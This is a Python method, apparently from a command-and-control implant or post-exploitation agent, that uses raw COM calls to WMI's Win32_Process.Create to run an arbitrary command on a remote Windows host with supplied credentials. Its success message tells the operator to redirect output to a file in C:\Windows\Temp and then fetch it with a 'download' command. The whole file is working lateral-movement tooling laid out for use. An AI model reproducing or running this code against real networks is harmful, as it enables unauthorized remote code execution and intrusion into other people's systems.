    def wmi_exec(self, task_id, target="", command="", username="", password=""):
        if platform.system() != 'Windows':
            return "wmi_exec: only supported on Windows"
        if not target or not command:
            return "wmi_exec: target and command are required"

        try:
            import ctypes
            import ctypes.wintypes as W

            ole32    = ctypes.windll.ole32
            oleaut32 = ctypes.windll.oleaut32

            # ── GUID ─────────────────────────────────────────────────────────
            class GUID(ctypes.Structure):
                _fields_ = [
                    ("Data1", W.DWORD),
                    ("Data2", W.WORD),
                    ("Data3", W.WORD),
                    ("Data4", ctypes.c_byte * 8),
                ]

            def _guid(s):
                g = GUID()
                ole32.CLSIDFromString(ctypes.c_wchar_p(s), ctypes.byref(g))
                return g

            CLSID_WbemLocator = _guid("{4590F811-1D3A-11D0-891F-00AA004B2E24}")
            IID_IWbemLocator  = _guid("{DC12A687-737F-11CF-884D-00AA004B2E24}")
            IID_IWbemServices = _guid("{9556DC99-828C-11CF-A37E-00AA003240C7}")

            # ── VARIANT (16 bytes em 64-bit) ──────────────────────────────────
            class _VU(ctypes.Union):
                _fields_ = [
                    ("llVal",   ctypes.c_longlong),
                    ("lVal",    ctypes.c_long),
                    ("bstrVal", ctypes.c_void_p),
                    ("punkVal", ctypes.c_void_p),
                ]

            class VARIANT(ctypes.Structure):
                _fields_ = [
                    ("vt",         ctypes.c_ushort),
                    ("wReserved1", ctypes.c_ushort),
                    ("wReserved2", ctypes.c_ushort),
                    ("wReserved3", ctypes.c_ushort),
                    ("u",          _VU),
                ]

            VT_EMPTY = 0
            VT_I4    = 3
            VT_BSTR  = 8

            def _bstr(s):
                return oleaut32.SysAllocString(ctypes.c_wchar_p(s))

            def _bstr_var(s):
                v = VARIANT()
                v.vt = VT_BSTR
                v.u.bstrVal = _bstr(s)
                return v

            # ── helper: chama função N do vtable do objeto COM ────────────────
            def _vfn(obj_addr, idx, restype, *argtypes):
                vtbl = ctypes.cast(obj_addr, ctypes.POINTER(ctypes.c_void_p))[0]
                fptr = ctypes.cast(vtbl, ctypes.POINTER(ctypes.c_void_p))[idx]
                return ctypes.WINFUNCTYPE(restype, ctypes.c_void_p, *argtypes)(fptr)

            # ── constantes COM ────────────────────────────────────────────────
            CLSCTX_INPROC_SERVER       = 1
            COINIT_MULTITHREADED       = 0
            RPC_C_AUTHN_WINNT          = 10
            RPC_C_AUTHZ_NONE           = 0
            RPC_C_AUTHN_LEVEL_CALL     = 3
            RPC_C_IMP_LEVEL_IMPERSONATE = 3
            EOAC_NONE                  = 0
            WBEM_FLAG_RETURN_IMMEDIATELY = 0x10

            # ── inicializa COM ────────────────────────────────────────────────
            hr = ole32.CoInitializeEx(None, COINIT_MULTITHREADED)
            # S_OK=0, S_FALSE=1, RPC_E_CHANGED_MODE=0x80010106 → todos ok
            co_uninit = hr in (0, 1)

            # CoInitializeSecurity — pode falhar se já configurado, ignoramos
            ole32.CoInitializeSecurity(
                None, -1, None, None,
                RPC_C_AUTHN_LEVEL_CALL,
                RPC_C_IMP_LEVEL_IMPERSONATE,
                None, EOAC_NONE, None
            )

            # ── cria IWbemLocator ─────────────────────────────────────────────
            p_loc = ctypes.c_void_p(None)
            hr = ole32.CoCreateInstance(
                ctypes.byref(CLSID_WbemLocator), None,
                CLSCTX_INPROC_SERVER,
                ctypes.byref(IID_IWbemLocator),
                ctypes.byref(p_loc)
            )
            if hr != 0:
                if co_uninit: ole32.CoUninitialize()
                return "wmi_exec: CoCreateInstance(IWbemLocator) failed (0x{:08x})".format(
                    hr & 0xFFFFFFFF)

            # ── ConnectServer → IWbemServices ─────────────────────────────────
            # vtable[3] — HRESULT ConnectServer(BSTR ns, BSTR user, BSTR pass, BSTR locale,
            #              LONG flags, BSTR authority, IWbemContext*, IWbemServices**)
            ConnectServer = _vfn(
                p_loc.value, 3, ctypes.HRESULT,
                ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p,
                ctypes.c_void_p, ctypes.c_long, ctypes.c_void_p,
                ctypes.c_void_p, ctypes.POINTER(ctypes.c_void_p)
            )

            ns   = _bstr("\\\\{}\\root\\cimv2".format(target))
            buser = _bstr(username) if username else None
            bpass = _bstr(password) if password else None

            p_svc = ctypes.c_void_p(None)
            hr = ConnectServer(p_loc.value, ns, buser, bpass,
                               None, 0, None, None, ctypes.byref(p_svc))

            oleaut32.SysFreeString(ns)
            if buser: oleaut32.SysFreeString(buser)
            if bpass: oleaut32.SysFreeString(bpass)
            _vfn(p_loc.value, 2, ctypes.c_ulong)(p_loc.value)  # Release locator

            if hr != 0:
                if co_uninit: ole32.CoUninitialize()
                return "wmi_exec: ConnectServer({}) failed (0x{:08x})\n" \
                       "  Causas comuns: acesso negado, alvo inacessível, " \
                       "credenciais inválidas".format(target, hr & 0xFFFFFFFF)

            # ── CoSetProxyBlanket no IWbemServices ────────────────────────────
            ole32.CoSetProxyBlanket(
                p_svc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, None,
                RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE,
                None, EOAC_NONE
            )

            # ── GetObject("Win32_Process") → IWbemClassObject ─────────────────
            # vtable[6] — HRESULT GetObject(BSTR path, LONG flags, IWbemContext*,
            #              IWbemClassObject**, IWbemCallResult**)
            GetObject = _vfn(
                p_svc.value, 6, ctypes.HRESULT,
                ctypes.c_void_p, ctypes.c_long, ctypes.c_void_p,
                ctypes.POINTER(ctypes.c_void_p), ctypes.c_void_p
            )

            p_cls = ctypes.c_void_p(None)
            b_cls = _bstr("Win32_Process")
            hr = GetObject(p_svc.value, b_cls, 0, None, ctypes.byref(p_cls), None)
            oleaut32.SysFreeString(b_cls)

            if hr != 0:
                _vfn(p_svc.value, 2, ctypes.c_ulong)(p_svc.value)
                if co_uninit: ole32.CoUninitialize()
                return "wmi_exec: GetObject(Win32_Process) failed (0x{:08x})".format(
                    hr & 0xFFFFFFFF)

            # ── GetMethod("Create") → ppInSignature (IWbemClassObject) ──────────
            # vtable[20] — HRESULT GetMethod(BSTR name, LONG flags,
            #               IWbemClassObject** ppIn, IWbemClassObject** ppOut)
            GetMethod = _vfn(
                p_cls.value, 20, ctypes.HRESULT,
                ctypes.c_void_p, ctypes.c_long,
                ctypes.POINTER(ctypes.c_void_p), ctypes.POINTER(ctypes.c_void_p)
            )

            p_insig = ctypes.c_void_p(None)
            b_create = _bstr("Create")
            hr = GetMethod(p_cls.value, b_create, 0, ctypes.byref(p_insig), None)
            oleaut32.SysFreeString(b_create)
            _vfn(p_cls.value, 2, ctypes.c_ulong)(p_cls.value)  # Release class

            if hr != 0:
                _vfn(p_svc.value, 2, ctypes.c_ulong)(p_svc.value)
                if co_uninit: ole32.CoUninitialize()
                return "wmi_exec: GetMethod(Create) failed (0x{:08x})".format(
                    hr & 0xFFFFFFFF)

            # ── SpawnInstance → p_inp (instância de parâmetros de entrada) ─────
            # vtable[16] — HRESULT SpawnInstance(LONG flags, IWbemClassObject** ppNewInst)
            SpawnInstance = _vfn(
                p_insig.value, 16, ctypes.HRESULT,
                ctypes.c_long, ctypes.POINTER(ctypes.c_void_p)
            )

            p_inp = ctypes.c_void_p(None)
            hr = SpawnInstance(p_insig.value, 0, ctypes.byref(p_inp))
            _vfn(p_insig.value, 2, ctypes.c_ulong)(p_insig.value)  # Release sig

            if hr != 0:
                _vfn(p_svc.value, 2, ctypes.c_ulong)(p_svc.value)
                if co_uninit: ole32.CoUninitialize()
                return "wmi_exec: SpawnInstance failed (0x{:08x})".format(
                    hr & 0xFFFFFFFF)

            # ── Put("CommandLine", BSTR variant) ─────────────────────────────
            # vtable[5] — HRESULT Put(LPCWSTR name, LONG flags, VARIANT* val, CIMTYPE type)
            Put = _vfn(
                p_inp.value, 5, ctypes.HRESULT,
                ctypes.c_wchar_p, ctypes.c_long,
                ctypes.POINTER(VARIANT), ctypes.c_long
            )

            var_cmd = _bstr_var(command)
            hr = Put(p_inp.value, "CommandLine", 0, ctypes.byref(var_cmd), 0)
            oleaut32.VariantClear(ctypes.byref(var_cmd))

            if hr != 0:
                _vfn(p_inp.value, 2, ctypes.c_ulong)(p_inp.value)
                _vfn(p_svc.value, 2, ctypes.c_ulong)(p_svc.value)
                if co_uninit: ole32.CoUninitialize()
                return "wmi_exec: Put(CommandLine) failed (0x{:08x})".format(
                    hr & 0xFFFFFFFF)

            # ── ExecMethod("Win32_Process", "Create", ...) ───────────────────
            # vtable[24] — HRESULT ExecMethod(BSTR objPath, BSTR method, LONG flags,
            #               IWbemContext*, IWbemClassObject* pIn, IWbemClassObject** ppOut,
            #               IWbemCallResult**)
            ExecMethod = _vfn(
                p_svc.value, 24, ctypes.HRESULT,
                ctypes.c_void_p, ctypes.c_void_p, ctypes.c_long,
                ctypes.c_void_p, ctypes.c_void_p,
                ctypes.POINTER(ctypes.c_void_p), ctypes.c_void_p
            )

            b_path   = _bstr("Win32_Process")
            b_method = _bstr("Create")
            p_out    = ctypes.c_void_p(None)

            hr = ExecMethod(
                p_svc.value, b_path, b_method,
                0, None,
                p_inp.value, ctypes.byref(p_out), None
            )
            oleaut32.SysFreeString(b_path)
            oleaut32.SysFreeString(b_method)
            _vfn(p_inp.value, 2, ctypes.c_ulong)(p_inp.value)   # Release in-params
            _vfn(p_svc.value, 2, ctypes.c_ulong)(p_svc.value)   # Release services

            if hr != 0:
                if co_uninit: ole32.CoUninitialize()
                return "wmi_exec: ExecMethod failed (0x{:08x})".format(
                    hr & 0xFFFFFFFF)

            # ── lê ReturnValue e ProcessId dos out-params ─────────────────────
            # vtable[4] — HRESULT Get(LPCWSTR name, LONG flags, VARIANT* val,
            #              CIMTYPE* type, LONG* flavor)
            Get = _vfn(
                p_out.value, 4, ctypes.HRESULT,
                ctypes.c_wchar_p, ctypes.c_long,
                ctypes.POINTER(VARIANT), ctypes.c_void_p, ctypes.c_void_p
            )

            var_rv  = VARIANT(); var_rv.vt = VT_EMPTY
            var_pid = VARIANT(); var_pid.vt = VT_EMPTY

            Get(p_out.value, "ReturnValue", 0, ctypes.byref(var_rv),  None, None)
            Get(p_out.value, "ProcessId",   0, ctypes.byref(var_pid), None, None)

            return_value = var_rv.u.lVal
            process_id   = var_pid.u.lVal

            oleaut32.VariantClear(ctypes.byref(var_rv))
            oleaut32.VariantClear(ctypes.byref(var_pid))
            _vfn(p_out.value, 2, ctypes.c_ulong)(p_out.value)   # Release out-params

            if co_uninit:
                ole32.CoUninitialize()

            # ReturnValue de Win32_Process.Create:
            # 0=Success, 2=Access Denied, 3=Insufficient Privilege, 8=Unknown,
            # 9=Path Not Found, 21=Invalid Parameter
            _rv_map = {
                2:  "Access Denied",
                3:  "Insufficient Privilege",
                8:  "Unknown failure",
                9:  "Path Not Found",
                21: "Invalid Parameter",
            }
            if return_value == 0:
                return (
                    "[+] WMI Win32_Process.Create success\n"
                    "    Target  : {}\n"
                    "    PID     : {}\n"
                    "    Command : {}\n\n"
                    "[*] Para capturar output redirecione stdout antes de executar:\n"
                    "    wmi_exec {} \"cmd /c {} > C:\\\\Windows\\\\Temp\\\\o.txt 2>&1\"\n"
                    "    download {} C:\\\\Windows\\\\Temp\\\\o.txt"
                ).format(target, process_id, command, target, command, target)
            else:
                return "[-] WMI Create falhou em {}: {} (code {})".format(
                    target, _rv_map.get(return_value, "code {}".format(return_value)),
                    return_value)

        except Exception as e:
            return "wmi_exec error: {}".format(e)
